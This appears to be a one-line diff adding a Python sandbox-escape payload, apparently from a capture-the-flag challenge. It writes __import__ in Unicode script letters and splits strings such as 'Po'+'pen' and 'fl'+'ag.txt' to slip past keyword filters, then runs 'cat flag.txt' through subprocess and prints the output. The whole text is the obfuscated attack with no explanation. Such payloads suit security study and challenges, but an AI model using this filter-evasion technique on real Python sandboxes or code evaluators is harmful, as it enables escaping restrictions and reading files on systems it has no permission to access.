@@ -1,0 +1,1 @@
+subprocess = __𝓲𝓶𝓹𝓸𝓻𝓽__('subprocess');SSmodule =  __𝓲𝓶𝓹𝓸𝓻𝓽__('sy'+'s');tmp = subprocess.__getattribute__('Po'+'pen')(['cat', 'fl'+'ag.txt'],stdout=subprocess.PIPE).communicate()[0];print(tmp);
